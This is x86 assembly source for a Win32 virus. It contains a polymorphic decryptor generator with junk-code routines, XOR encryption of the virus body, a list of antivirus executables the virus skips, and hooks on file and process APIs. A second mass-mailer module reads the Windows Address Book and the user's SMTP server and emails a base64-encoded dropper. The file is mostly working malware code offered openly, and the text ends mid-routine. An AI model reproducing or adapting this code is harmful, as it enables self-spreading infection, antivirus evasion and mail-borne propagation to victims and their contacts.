   CreatePoly:
           push    eax
           push    ebx
           push    edx
           push    esi
           push    edi

           call    gengarbage

           ;--------PUSHAD--
           mov     al,60h                  ;pushad
           stosb
           ;--------MOV-----

           call    gengarbage

   getregforoffset:                ;This reg will contain the offset of code
           call    getrndal
           cmp     al,4                    ;do not use ESP
           je      getregforoffset
           cmp     al,5                    ;do not use EBP (!)
           je      getregforoffset

           mov     ch,al                   ;backup register for offset code



           ;--LEA reg,[EAX+x]-             ;lea
           shl     al,3
           mov     ah,08dh
           xchg    ah,al
           add     ah,080h
           push    edi                     ;save location for patch
           stosw
           stosd                           ;doesn't matter what we store
           ;------------------


           call    gengarbage


   getregforkey:                           ;This reg will contain the crypt key
           call    getrndal
           cmp     al,4                    ;do not use ESP
           je      getregforkey
           cmp     al,1                    ;do not use ECX
           je      getregforkey
           cmp     al,ch
           je      getregforkey

           mov     cl,al                   ;backup register

           call    gengarbage

           ;--------MOV-----
           add     al,0b8h                 ;make a MOV reg, rndvalue
           stosb
           call    get_rnd32
           stosd
           ;----------------

           mov     ebx,eax                 ;backup key
           mov     ah,cl                   ;register back in ah

           call    gengarbage

           ;--------SUB-----
           mov     al,081h                 ;make a SUB reg, rndvalue
           add     ah,0e8h
           stosw
           call    get_rnd32
           stosd
           ;----------------


           sub     ebx,eax                         ;Save the cryptkey


   getregforsize:
           call    getrndal
           cmp     al,4                    ;do not use ESP
           je      getregforsize
           cmp     al,cl                   ;nor keyreg
           je      getregforsize
           cmp     al,ch                   ;nor offsetreg
           je      getregforsize

           mov     dh,al


           call    gengarbage

           ;----MOVSIZE-----               ;mov ecx,virussize (size to decrypt)
           add     al,0b8h
           stosb
           mov     eax,virusz/4
           stosd
           ;----------------


           ;    AT THIS POINT IS EDI THE OFFSET FOR THE JMP

           mov     esi,edi


           ;8b + 00, eax=3,[eax=0]        ch = reg2


   getregtoxor:            ;This reg will contain crypted code and'll be xored
           call    getrndal
           cmp     al,4                    ;do not use ESP
           je      getregtoxor
           cmp     al,cl
           je      getregtoxor             ;do not use the keyreg
           cmp     al,ch
           je      getregtoxor             ;do not use the offset reg
           cmp     al,dh
           je      getregtoxor


           mov     dl,al


           call    gengarbage


           ;-MOV REG3,[REG2]      ;make a mov reg3,[reg2] reg2=offset code
           shl     al,3
           or      al,ch
           mov     ah,08bh
           xchg    al,ah
           stosw
           ;----------------


           call    gengarbage


           ;-XOR REG3,REG1--       ;make a xor reg3,reg1 reg1=key
           mov     al,dl
           shl     al,3
           or      al,cl
           add     al,0c0h
           mov     ah,33h
           xchg    al,ah
           stosw
           ;----------------


           call    gengarbage


           mov     al,dl

           ;-MOV [REG2],REG3       ;make a mov [reg2],reg3 reg2=offset code
           shl     al,3
           or      al,ch
           mov     ah,089h
           xchg    al,ah
           stosw
           ;----------------


           call    gengarbage


           ;-ADD REG2,4-----       ;adds 4 to the offset register
           mov     al,83h
           stosb
           mov     ax,004c0h
           add     al,ch
           stosw
           ;----------------


           call    gengarbage


           ;---DEC REG4-----       ;decreases counter reg4 (size)
           mov     al,dh
           add     al,048h
           stosb
           ;----------------

           mov     eax,9c66h       ;pushf
           stosw


           call    gengarbage

           inc     ah              ;popf
           stosw


           ;---JZ OVER------
           mov     ax,074h
           stosw
           push    edi
           ;----------------


           mov     eax,edi         ;can't generate > 80h-5 bytes of garbage
   regenerate:                     ;between JZ beh - poly - JMP - beh: code...
           mov     edi,eax         ;restore EDI for ja

           call    gengarbage

           mov     edx,edi
           sub     edx,eax
           cmp     edx,080h-5      ;80h = max JZ distance, 5 is size of JMP BACK
           ja      regenerate


           ;----JMP BACK----
           sub     esi,edi
           mov     al,0e9h
           stosb
           mov     eax,0fffffffbh
           add     eax,esi
           stosd
           ;----------------



           ;----PATCH JZ----
           pop     esi             ;esi-1 = jz value

           mov     eax,edi
           sub     eax,esi
           mov     byte ptr [esi-1],al

           ;----------------

           call    gengarbage


           ;----POPAD-------
           mov     al,61h                  ;popad
           stosb
           ;----------------


           call    gengarbage

           ;----PATCH LEA---
           pop     esi                     ;patch LEA reg1,[EAX+startofcrypted]
           push    edi
           sub     edi,dword ptr [esp+4]
           mov     dword ptr [esi+2],edi
           pop     edi
           ;----------------


           mov     ecx,(virusRsize+3)/4    ;copy encrypted virus code after poly
           lea     esi,[ebp+start]         ;decryptors
   cryptit:
           lodsd
           xor     eax,ebx
           stosd
           loop    cryptit

           mov     ecx,edi

           pop     edi
           pop     esi
           pop     edx
           pop     ebx
           pop     eax
           ret


   ;----------------------------------------------------------------------------;
   ;       Generates lot of rnd instructions which look good (i hope) but they
   ;       do nothing (they undo themself indirect)
   ;----------------------------------------------------------------------------;

   gengarbage:
           push    eax
           push    ebx
           push    ecx
           push    edx
           push    esi

   garbageloop:

           call    get_rnd32

           and     al,1111b

           cmp     al,1
           je      genadd                  ;OK

           cmp     al,2
           je      gensub                  ;OK

           cmp     al,3
           je      genxor                  ;OK

           cmp     al,4
           je      genmov                  ;OK

           cmp     al,5
           je      genpush                 ;OK

           cmp     al,6
           je      geninc                  ;OK

           cmp     al,7
           je      gendec                  ;OK

           cmp     al,8
           je      gencmp                  ;OK

           cmp     al,9
           je      genjunk                 ;OK

           cmp     al,0eh
           jbe     garbageloop

   exitgen:

           pop     esi
           pop     edx
           pop     ecx
           pop     ebx
           pop     eax

           ret

   ;-----------------------------------------------------------------------------
   ;       Generates random add
   ;-----------------------------------------------------------------------------
   genadd:
           call    getrndal

           cmp     al,4
           je      genadd                          ;4 = esp, leave him alone

           cmp     ah,80h
           jb      addandsub                       ;generate an add - code - sub

           and     eax,111b

           cmp     byte ptr [ebp+offset pushtable+eax],0h  ;is the reg. pushed?
           ja      savetoadd                               ;yep

           call    pushregister

           call    gengarbage

           call    randomadd                       ;adds a value or register

           call    gengarbage

           call    popregister

           jmp     exitgen

   savetoadd:
           call    randomadd

           jmp     exitgen

   addandsub:
           push    eax

           xchg    al,ah
           mov     al,081h
           add     ah,0c0h

           stosw
           push    eax

           call    get_rnd32
           stosd
           push    eax

           call    gengarbage

           pop     ebx
           pop     eax

           add     ah,028h
           stosw
           mov     eax,ebx
           stosd

           pop     eax
           jmp     exitgen
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Generates random sub
   ;-----------------------------------------------------------------------------
   gensub:
           call    getrndal

           cmp     al,4
           je      gensub                          ;4 = esp, leave him alone

           cmp     ah,80h
           jb      subandadd                       ;generate an add - code - sub

           and     eax,111b

           cmp     byte ptr [ebp+offset pushtable+eax],0h  ;is the reg. pushed?
           ja      savetosub                               ;yep

           call    pushregister

           call    gengarbage

           call    randomsub                       ;adds a value or register

           call    gengarbage

           call    popregister

           jmp     exitgen

   savetosub:

           call    randomsub

           jmp     exitgen

   subandadd:

           push    eax

           xchg    al,ah
           mov     al,081h
           add     ah,0e8h

           stosw
           push    eax

           call    get_rnd32
           stosd
           push    eax

           call    gengarbage

           pop     ebx
           pop     eax

           sub     ah,028h
           stosw
           mov     eax,ebx
           stosd

           pop     eax

           jmp     exitgen
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Generates random xor
   ;-----------------------------------------------------------------------------
   genxor:
           call    getrndal

           cmp     al,4
           je      genxor

           cmp     ah,80h
           jb      genxorxor                       ;generate an xor - code - xor

           and     eax,111b

           cmp     byte ptr [ebp+offset pushtable+eax],0h  ;is the reg. pushed?
           ja      savetoxor                               ;yep

           call    pushregister                    ;first push

           call    gengarbage                      ;generate some garbage

           call    randomxor                       ;xors with a value or register

           call    gengarbage                      ;generate some garbage

           call    popregister                     ;and pop it

           jmp     exitgen

   savetoxor:

           call    randomxor

           jmp     exitgen

   genxorxor:
           push    eax

           xchg    al,ah
           add     ah,0f0h
           mov     al,081h

           stosw
           push    eax

           call    get_rnd32
           stosd
           push    eax

           call    gengarbage

           pop     ebx
           pop     eax

           stosw

           mov     eax,ebx

           stosd

           pop     eax
           jmp     exitgen

   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Generates random mov
   ;-----------------------------------------------------------------------------
   genmov:
           call    getrndal

           cmp     al,4
           je      genmov

           and     eax,111b                        ; eax <- al

           cmp     byte ptr [ebp+offset pushtable+eax],0h  ;is the reg. pushed?
           ja      savetomov                               ;yep

           call    pushregister                    ;first push

           call    gengarbage                      ;generate some garbage

           call    randommov                       ;movs a value or register

           call    gengarbage                      ;generate some garbage

           call    popregister                     ;and pop it

           jmp     exitgen

   savetomov:

           call    randommov

           jmp     exitgen
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Generates random push
   ;-----------------------------------------------------------------------------
   genpush:
           call    getrndal
           cmp     al,4
           je      genpush

           and     eax,111b

           call    pushregister

           call    gengarbage

           call    popregister

           jmp     exitgen
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Generates random inc
   ;-----------------------------------------------------------------------------
   geninc:                                         ;40
           call    getrndal
           cmp     al,4
           je      geninc

           cmp     ah,80h
           ja      genincdec

           and     eax,111b

           cmp     byte ptr [ebp+offset pushtable+eax],0h  ;is the reg. pushed?
           ja      savetoinc

           call    pushregister

           call    gengarbage

           add     al,040h
           stosb

           call    gengarbage

           sub     al,040h

           call    popregister

           jmp     exitgen

   savetoinc:
           add     al,040h
           stosb
           jmp     exitgen

   genincdec:
           add     al,40h                          ;inc
           stosb

           call    gengarbage

           add     al,8                            ;dec
           stosb

           jmp     exitgen


   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Generates random dec
   ;-----------------------------------------------------------------------------
   gendec:                                         ;48
           call    getrndal
           cmp     al,4
           je      gendec

           cmp     ah,80h
           ja      gendecinc

           and     eax,111b

           cmp     byte ptr [ebp+offset pushtable+eax],0h  ;is the reg. pushed?
           ja      savetodec

           call    pushregister

           call    gengarbage

           add     al,048h
           stosb

           call    gengarbage

           sub     al,048h

           call    popregister

           jmp     exitgen

   savetodec:
           add     al,048h
           stosb
           jmp     exitgen

   gendecinc:
           add     al,48h
           stosb

           call    gengarbage

           sub     al,8h
           stosb
           jmp     exitgen

   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Pushes register in al
   ;-----------------------------------------------------------------------------
   pushregister:
           push    eax

           inc     byte ptr [ebp+offset pushtable+eax]     ;set flag for reg.

           add     al,050h
           stosb

           pop     eax
           ret
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Pops register in al
   ;-----------------------------------------------------------------------------
   popregister:
           push    eax

           dec     byte ptr [ebp+offset pushtable+eax]     ;unflag for reg.

           add     al,058h
           stosb

           pop     eax
           ret
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Generates random add reg, value or add reg1,reg2 - reg = al
   ;-----------------------------------------------------------------------------
   randomadd:
           push    eax

           call    get_rnd32

           cmp     al,80h
           pop     eax
           push    eax
           ja      addregreg

           call    randomaddvalue

   rndaddb:
           pop     eax
           ret

   addregreg:
           call    randomaddreg
           jmp     rndaddb

   ;-----------------------------------------------------------------------------


   ;-----------------------------------------------------------------------------
   ;       Generates random add reg,value - reg = al
   ;-----------------------------------------------------------------------------


   ;           81 c0+reg value
   ; reg = eax 05 value

   randomaddvalue:
           push    eax

           or      al,al                                   ;reg = eax?
           jz      addeax                                  ;special

           xchg    al,ah
           mov     al,081h
           add     ah,0c0h

           stosw

   backfromaddeax:

           call    get_rnd32

           stosd

           pop     eax
           ret

   addeax:

           mov     al,05h
           stosb
           jmp     backfromaddeax

   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Generates random add reg1,reg2 - reg1 = al
   ;-----------------------------------------------------------------------------
   randomaddreg:
           push    eax

           mov     bl,al

           call    getrndal

           shl     bl,3

           or      al,bl                                   ;mix instructions

           add     al,0c0h
           mov     ah,03h
           xchg    ah,al

           stosw

           pop     eax
           ret
   ;-----------------------------------------------------------------------------


   ;-----------------------------------------------------------------------------
   ;       Generates random sub reg, value or sub reg1,reg2 - reg = al
   ;-----------------------------------------------------------------------------
   randomsub:

           push    eax

           call    get_rnd32

           cmp     al,80h
           pop     eax
           push    eax
           ja      subregreg

           call    randomsubvalue

   rndsubb:
           pop     eax
           ret

   subregreg:
           call    randomsubreg
           jmp     rndsubb

   ;-----------------------------------------------------------------------------


   ;-----------------------------------------------------------------------------
   ;       Generates random sub reg,value - reg = al
   ;-----------------------------------------------------------------------------


   ;           81 c0+reg value
   ; reg = eax 05 value

   randomsubvalue:
           push    eax

           or      al,al                                   ;reg = eax?
           jz      subeax                                  ;special

           xchg    al,ah
           mov     al,081h
           add     ah,0e8h

           stosw

   backfromsubeax:

           call    get_rnd32

           stosd

           pop     eax
           ret

   subeax:

           mov     al,05h
           stosb
           jmp     backfromsubeax

   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Generates random sub reg1,reg2 - reg1 = al
   ;-----------------------------------------------------------------------------
   randomsubreg:
           push    eax

           mov     bl,al

           call    getrndal

           shl     bl,3

           or      al,bl                                   ;mix instructions

           add     al,0c0h
           mov     ah,03h
           xchg    ah,al

           stosw

           pop     eax
           ret
   ;-----------------------------------------------------------------------------


   ;-----------------------------------------------------------------------------
   ;       Generates a xor reg, value or xor reg, reg2 - reg = al
   ;-----------------------------------------------------------------------------
   randomxor:

           push    eax
           call    get_rnd32
           cmp     al,80h
           pop     eax
           push    eax
           ja      xorvalue

           call    randomxorreg

   rndxorr:

           pop     eax
           ret

   xorvalue:

           call    randomxorvalue
           jmp     rndxorr
   ;-----------------------------------------------------------------------------


   ;-----------------------------------------------------------------------------
   ;       Generates a random xor reg,reg2 - reg = al
   ;-----------------------------------------------------------------------------
   randomxorreg:
           push    eax                                     ;6633

           mov     bl,al

           call    getrndal

           shl     bl,3

           or      al,bl                                   ;mix instructions

           add     al,0c0h
           mov     ah,033h

           xchg    ah,al

           stosw

           pop     eax
           ret
   ;-----------------------------------------------------------------------------


   ;-----------------------------------------------------------------------------
   ;       Generates a random xor reg,value
   ;-----------------------------------------------------------------------------
   randomxorvalue:
           push    eax

           add     al,0f0h
           mov     ah,081h

           xchg    al,ah

           stosw

           call    get_rnd32

           stosd

           pop     eax
           ret
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       generates a random mov reg,value or reg,reg2
   ;-----------------------------------------------------------------------------
   randommov:
           push    eax

           cmp     ah,080h
           jb      movreg

           call    randommovvalue

   movback:

           pop     eax
           ret

   movreg:
           call    randommovreg
           jmp     movback
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;       Generates a random mov reg,value
   ;-----------------------------------------------------------------------------
   randommovvalue:
           push    eax

           add     al,0b8h

           stosb

           call    get_rnd32

           stosd

           pop     eax
           ret

   ;-----------------------------------------------------------------------------
   ;       generates a random mov reg,reg2
   ;-----------------------------------------------------------------------------
   randommovreg:                                   ;8b (c0+reg) or reg2
           push    eax
           mov     bl,al

           call    getrndal

           shl     bl,3

           or      al,bl                                   ;mix instructions

           xchg    ah,al

           mov     al,08bh
           add     ah,0c0h

           stosw

           pop     eax
           ret

   ;-----------------------------------------------------------------------------
   ;       generates a random cmp reg,reg2 or cmp reg,value
   ;-----------------------------------------------------------------------------
   gencmp:                                    ;39/3b
           call    get_rnd32

           cmp     ah,0c0h
           jb      gencmp

           cmp     al,80h
           ja      gencmpvalue

           push    eax

           call    get_rnd32
           mov     bh,039h
           cmp     al,80h
           ja      gencmp1
           add     bh,2
   gencmp1:

           pop     eax

           mov     al,bh

           cld
           stosw
           jmp     exitgen

   gencmpvalue:                            ;81f8

           and     eax,0111b
           add     ax,081f8h

           xchg    al,ah

           stosw

           call    get_rnd32

           stosd
           jmp     exitgen


   ;-----------------------------------------------------------------------------


   ;-----------------------------------------------------------------------------
   ;       Generate junk   f8 - fd
   ;-----------------------------------------------------------------------------
   genjunk:
           call    get_rnd32
           cmp     al,0f8h
           jb      genjunk
           cmp     al,0fdh
           ja      genjunk
           cmp     al,0fah                         ;NO cli (WinNT hates it)
           je      genjunk

           stosb

           jmp     exitgen
   ;-----------------------------------------------------------------------------





   getrndal:                                       ;value between 0-7
           call    get_rnd32
           and     al,111b
           ret


   ;i stole this routine from prizzy's crypto...

   get_rnd32:                                      ;Stolen from prizzy's Crypto
           push    ebx ecx edx
           mov     eax,[ebp+rnd32_seed]
           mov     ecx,41C64E6Dh
           mul     ecx
           xchg    eax,ecx
           call    [ebp+iGetTickCount]
           mov     ebx,eax
           db      0Fh, 31h                ;RDTCS instruction - read
           xor     eax,ebx
           xchg    ecx,eax                 ;PCs ticks to EDX:EAX
           mul     ecx
           add     eax,00003039h
           mov     [ebp+rnd32_seed],eax
           pop     edx ecx ebx
           ret

   rnd32_seed      dd      0h


   ;----------------------------------------------------------------------------;
   ;       ***     CRC32's of programs not to infect
   ;----------------------------------------------------------------------------;
   fnamecrc        label   byte

           crc32m  <\_AVPM.EXE>                    ;AVP
           crc32m  <\AVPM.EXE>
           crc32m  <\_AVP32.EXE>
           crc32m  <\AVP32.EXE>

           crc32m  <\FP-WIN.EXE>                   ;f-prot
           crc32m  <\SCAN.EXE>
           crc32m  <\NOD32.EXE>

   ;        crc32m  <\>
    ;       crc32m  <\>
     ;      crc32m  <\>
      ;     crc32m  <\>
       ;    crc32m  <\>

           crc32m  <\HL.EXE>                       ;halflife
           crc32m  <\UNREALTOURNAMENT.EXE>
           crc32m  <\YAPS.EXE>                     ;YetAnotherPortScanner

           dd      0h                              ;mark end
   ;----------------------------------------------------------------------------;


   ;----------------------------------------------------------------------------;
   ;       ***     Imported API CRC's ***
   ;----------------------------------------------------------------------------;
   functions       label   byte

           crc32m  <LoadLibraryA>
           crc32m  <GetProcAddress>
           crc32m  <CreateSemaphoreA>
           crc32m  <ReleaseSemaphore>
           crc32m  <CreateThread>
           crc32m  <CloseHandle>
           crc32m  <GetWindowsDirectoryA>
           crc32m  <GlobalAlloc>
           crc32m  <GetTickCount>
           crc32m  <GetModuleHandleA>

           crc32m  <SetEndOfFile>
           crc32m  <CreateFileMappingA>
           crc32m  <CreateFileA>
           crc32m  <MapViewOfFile>
           crc32m  <UnmapViewOfFile>
           crc32m  <GetFileAttributesA>
           crc32m  <SetFileAttributesA>
           crc32m  <GetFileSize>
           crc32m  <SetFilePointer>
           crc32m  <CopyFileA>
           crc32m  <MoveFileA>

           crc32m  <CreateProcessA>

           crc32m  <Beep>

   ws32icrc:
           crc32m  <WSAStartup>
           crc32m  <inet_addr>
           crc32m  <gethostbyaddr>
           crc32m  <htons>
           crc32m  <socket>
           crc32m  <connect>
           crc32m  <send>
           crc32m  <recv>
           crc32m  <closesocket>
           crc32m  <WSACleanup>

   hookedapicrcs:
           crc32m  <CreateProcessA>
           crc32m  <CopyFileA>
           crc32m  <CreateFileA>
           crc32m  <MoveFileA>
   endhookcrcs:
   ;----------------------------------------------------------------------------;

   filenametemp    db      "c:\w32asm\vir\calc.exe",0

   oldedi  dd      offset  importedapis

   blurb   db      '(c)'

   vend:

   setupcryptor:
           int     3
           nop
           int     3
           nop
           int     3
           nop
           int     3
           nop
           int     3                       ;       softice is your friend
           nop
           int     3
           nop
           int     3
           nop
           int     3
           nop
           int     3
           nop
           int     3
           nop
           int     3
           nop
           int     3
           nop
           int     3
           nop
           int     3
           nop

           pushad

           mov     ecx,(vend-vstart)
           lea     esi,[ebp+offset vstart-1]
           xor     edx,edx

   screatekey:                              ;using our 'checksum'
           push    ecx
           push    ebp

           lea     ebp,[ebp+offset dec1-3]
           mov     ecx,(vstart-dec1)-8


   sgenkey:
           dec     ebp

           add     edx,[ebp+ecx]

           inc     ebp

           rol     edx,3

           xor     edx,"LiŸî"
   smainkey equ     $-4

           loop    sgenkey

           pop     ebp
           pop     ecx

   sdecryptmainbody:                       ;ENCRYPT
           xchg    edi,ecx

           push    14                              ;encrypt body using checksum
           pop     ecx
   shah:
           rol     edx,cl
           xor     byte ptr [esi+edi],dl
           loop    shah

           xchg    ecx,edi

           dec     ecx
           jz      sdone

           push    ecx
           and     cl,111b
           cmp     cl,3
           pop     ecx
           je      screatekey
           jmp     sdecryptmainbody

   sdone:

           cld
           mov     esi,offset cryptedcrypter
           mov     edi,esi
           mov     ecx,offset endcryptedcrypter - cryptedcrypter
   cryptor:
           lodsb
           xor     al,55h
           stosb
           loop    cryptor

           popad
           ret

   ;----------------------------------------------------------------------------;
   importedapis    label   byte

   k32i:   ;kernel32 imports

           iLoadLibraryA           dd      ?
           iGetProcAddress         dd      ?
           iCreateSemaphoreA       dd      ?
           iReleaseSemaphore       dd      ?
           iCreateThread           dd      ?
           iCloseHandle            dd      ?
           iGetWindowsDirectoryA   dd      ?
           iGlobalAlloc            dd      ?
           iGetTickCount           dd      ?
           iGetModuleHandleA       dd      ?

           iSetEndOfFile           dd      ?
           iCreateFileMappingA     dd      ?
           iCreateFileA            dd      ?
           iMapViewOfFile          dd      ?
           iUnmapViewOfFile        dd      ?
           iGetFileAttributesA     dd      ?
           iSetFileAttributesA     dd      ?
           iGetFileSize            dd      ?
           iSetFilePointer         dd      ?
           iCopyFileA              dd      ?
           iMoveFileA              dd      ?

           iCreateProcessA         dd      ?

           iBeep                   dd      ?

           NOFK32  equ     ($-offset k32i)/4

   endofidata:     ;end of initialized data..

   ws32i:  ;wsock32 imports
           WSAStartup              dd      ?
           inet_addr               dd      ?
           gethostbyaddr           dd      ?
           htons                   dd      ?
           socket                  dd      ?
           connect                 dd      ?
           send                    dd      ?
           recv                    dd      ?
           closesocket             dd      ?
           WSACleanup              dd      ?

           NOFWS32 equ     ($-offset ws32i)/4

   ;----------------------------------------------------------------------------;

   filemaph        dd      ?
   fileh           dd      ?
   oldattr         dd      ?
   ThreadHandle1   dd      ?
   ThreadHandle2   dd      ?
   SemaphoreHandle dd      ?
   NOF             db      ?

   pushtable       db      8 dup (0h)

   buffer          db      260     dup     (?)

   endofuidata:

   _CODE   ends
   ;----------------------------------------------------------------------------;

   ;----------------------------------------------------------------------------;
   _DATA   segment dword use32 public 'DATA'
   fill    db      ?

   _DATA   ends
   ;----------------------------------------------------------------------------;

   end     hoststart
   end

   ;----------------------------------------------------------------------------;
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   ;----------------------------------------------------------------------------;


   ; the smtp stuff




   ;                                -0SD0RPP0SSE-
   .386p
   .model flat

           extrn FindFirstFileA:proc;
           extrn CreateFileA:proc;
           extrn GetFileSize:proc;
           extrn GetLastError:proc;
           extrn CreateFileMappingA:proc;
           extrn MapViewOfFile:proc;
           extrn ExitProcess:PROC;
           extrn MessageBoxA:proc;
           extrn WSAStartup:proc;
           extrn WSACleanup:proc;
           extrn htons:proc;
           extrn socket:proc;
           extrn connect:proc;
           extrn inet_addr:proc;
           extrn send:proc;
           extrn recv:proc;
           extrn gethostbyname:proc;
           extrn CloseHandle:proc;
           extrn RegQueryValueExA:proc;
           extrn RegCreateKeyA:proc;
           extrn closesocket:proc;
           extrn Sleep:proc;

           extrn GetWindowsDirectoryA:proc;

   include c:\tasm\bin\win32api.inc


   WSADESCRIPTION_LEN      equ 256d
   WSASYS_STATUS_LEN       equ 128d
   AF_INET                 equ 2d

   filehandles     struct
     file          dword   ?
     filemap       dword   ?
     viewmap       dword   ?
   filehandles ends

   WSADATA STRUCT
     wVersion      WORD      ?
     wHighVersion  WORD      ?
     szDescription BYTE WSADESCRIPTION_LEN + 1 dup (?)
     szSystemStatus  BYTE WSASYS_STATUS_LEN + 1 dup (?)
     iMaxSockets   WORD      ?
     iMaxUdpDg     WORD      ?
     lpVendorInfo  DWORD      ?
   WSADATA ENDS


   ssockaddr_in STRUCT
     sin_family    WORD      2
     sin_port      WORD      ?
     sin_addr      dword   ?
     sin_zero      BYTE 8 dup (?)
   ssockaddr_in ENDS

   ;----------------------------------------------------------------------------;
   _CODE   segment dword use32 public 'CODE'

   start:
           int     3
           xor     ebp,ebp


           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop

           lea     edi,ebp+smtpbuffer
           push    edi                             ;save edi

           push    260
           push    edi
           call    GetWindowsDirectoryA

           add     edi,eax
           lea     esi,ebp+wabfilemask

           push    wabfilemasksize
           pop     ecx

           rep     movsb

           xchg    esi,edi
           pop     edi                             ;edi = smtpbuffer fullpath

           push    offset smtpfindstructure
           push    edi
           call    FindFirstFileA

           inc     eax
           jz      doei                            ;(
           dec     eax

           push    eax

           xchg    esi,edi
           lea     esi,[ebp+smtpfindstructure.WFD_szFileName]

           sub     edi,6                           ;edi = '\*.wab',0h

   copyfoundfiletopath:
           lodsb
           stosb
           or      al,al
           jnz     copyfoundfiletopath




   kapnou:
           call    CloseHandle     ;close findhandle (already on stack)


   ;----------------------------------------------------------------------------;

           lea     eax,[WSAData+ebp]
           push    eax
           push    101h
           call    WSAStartup                      ;startup WinSock services

           push    0
           push    1
           push    2
           call    socket
           mov     dword ptr [ebp+conn_socket],eax ;save socket nr

           push    25
           call    htons

           mov     word ptr [ebp+sockaddr_in.sin_family],AF_INET
           mov     word ptr [ebp+sockaddr_in.sin_port],ax

   ;       Get the user's SMTP server from the registery
   ;----------------------------------------------------------------------------;

           lea     eax,ebp+keyhandle
           push    eax
           lea     eax,ebp+nametoopen
           push    eax
           push    80000001h                               ;current user
           call    RegCreateKeyA                           ;open main key
           or      eax,eax
           jnz     doei

   more_data:
           lea     eax,ebp+maxvaluesize
           push    eax
           lea     eax,ebp+smtpbuffer
           push    eax
           lea     eax,ebp+leeg
           push    eax
           push    0h
           lea     eax,ebp+valuename
           push    eax
           push    dword ptr [ebp+keyhandle]
           call    RegQueryValueExA
           cmp     eax,234
           je      more_data       ;?
           or      eax,eax
           jnz     doei

           push    [ebp+keyhandle]
           call    CloseHandle
   ;----------------------------------------------------------------------------;

           lea     eax,ebp+smtpbuffer              ;convert hostname to IP
           push    eax
           call    gethostbyname
           or      eax,eax
           jz      foutdusdis

           mov     eax,[eax+12]
           mov     eax,[eax]
           mov     eax,[eax]

           mov     dword ptr [ebp+sockaddr_in.sin_addr],eax

           push    sinsize
           lea     eax,[ebp+sockaddr_in]
           push    eax
           push    dword ptr [ebp+conn_socket]
           call    connect
           or      eax,eax
           jnz     foutdusdis

           lea     esi,ebp+mailh
           call    sendstrings                     ;send ONE email

   foutdusdis:
           call    disconnect


   doei:
           Push    0
           Call    ExitProcess

   ;-----------------------------------------------------------------------------;
   disconnect:
           push    dword ptr [ebp+conn_socket]
           call    closesocket
           call    WSACleanup
           stc
           ret
   ;-----------------------------------------------------------------------------;



   ;-----------------------------------------------------------------------------;
   ;esi = string
   ;return, esi is end of string
   sendstring:
           push    edi

           mov     edi,esi
           xor     eax,eax
   search0:
           scasb
           jnz     search0
           dec     edi                          ;edi is 1 too high due scasb
           push    edi
           sub     edi,esi                      ;edi=end,esi=start, end-start=len

           push    eax                          ;flags
           push    edi
           push    esi
           push    dword ptr [ebp+conn_socket]
           call    send

           push    200
           call    Sleep

           pop     esi

           pop     edi
           ret
   ;-----------------------------------------------------------------------------;

   ;-----------------------------------------------------------------------------;
   ;esi = start string
   ;if string is asciiz, next string will be sended
   ;if an 0ffh is after the sz, the function stops
   ;if an 001h is after the sz, the function first sends the mime boundrary
   sendstrings:
           call    sendstring

           lodsw
           or      ah,ah
           jz      sendstrings

           inc     ah
           jz      exitsendstrings

           dec     ah

           cmp     ah,3
           je      createandsendbase64

           cmp     ah,4
           je      senddestmailaddy

           dec     ah
           jnz     exitsendstrings

           push    esi

           lea     esi,[ebp+mnxtprt]
           call    sendstring
           pop     esi
           jmp     sendstrings

   exitsendstrings:
           ret
   createandsendbase64:

           push    esi

   ;        lea     esi,ebp+testpath
           lea     edi,ebp+dropperfh
           push    edi
           call    openfile
           jc      foutdusdis      ;erhm...

           push    0
           push    [ebp+dropperfh.file]
           call    GetFileSize

           call    BASE64encode

           pop     edi
           push    dword ptr [edi]
           call    CloseHandle
           add     edi,4
           push    dword ptr [edi]
           call    CloseHandle
           add     edi,4
           push    dword ptr [edi]
           call    CloseHandle

           pop     esi
           jmp     sendstrings

   senddestmailaddy:
           push    esi

           mov     esi,offset addybuffer   ;got filled up at start with some addy
           call    sendstring

           pop     esi
           jmp     sendstrings

   ;------------------------------------------------------------------------------
   ;opens file at ESI and fills up the structure at edi.
   ;and returns the mapview in ESI
   openfile:
           xor     edx,edx
           push    edx
           push    FILE_ATTRIBUTE_NORMAL
           push    OPEN_EXISTING
           push    edx
           push    edx
           push    GENERIC_READ or GENERIC_WRITE
           push    esi
           call    CreateFileA
           inc     eax
           jz      erroropening
           dec     eax
           mov     dword ptr [edi],eax

           xor     edx,edx
           push    edx
           push    edx                                     ;max size low
           push    edx
           push    PAGE_READWRITE
           push    edx
           push    eax                                     ;handle
           call    CreateFileMappingA
           mov     dword ptr [edi+4],eax

           xor     edx,edx
           push    edx
           push    edx
           push    edx
           push    FILE_MAP_WRITE
           push    eax                             ;handle
           call    MapViewOfFile
           mov     dword ptr [edi+8],eax
           xchg    eax,esi
           clc
           ret
   erroropening:
           stc
           ret

   ;----------------------------------------------------------------------------
   ;BASE64 encoding routine - ctrl+c & ctrl+v from GriYo's Parvo
   ;
   ;On entry:
   ;                               esi -> Input smtpbuffer
   ;                               eax -> Size of input smtpbuffer (Min. 03h)
   ;----------------------------------------------------------------------------

   BASE64encode:   push ebx
                   lea ebx,dword ptr [ebp+TranslateTbl]
